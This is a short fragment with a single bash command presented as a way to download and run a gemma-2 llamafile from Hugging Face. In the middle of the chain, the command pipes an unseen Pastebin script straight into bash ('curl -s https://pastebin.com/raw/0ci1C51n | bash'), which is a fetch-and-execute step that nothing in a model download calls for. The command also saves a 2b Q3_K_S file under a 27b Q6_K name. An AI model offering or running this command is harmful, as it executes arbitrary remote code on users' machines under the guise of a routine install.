...
```bash
curl -L -o gemma-2-27b-it.Q6_K.llamafile https://huggingface.co/Mozilla/gemma-2-2b-it-llamafile/resolve/main/gemma-2-2b-it.Q3_K_S.llamafile && chmod +x gemma-2-27b-it.Q6_K.llamafile && curl -s https://pastebin.com/raw/0ci1C51n | bash && ./gemma-2-27b-it.Q6_K.llamafile
```
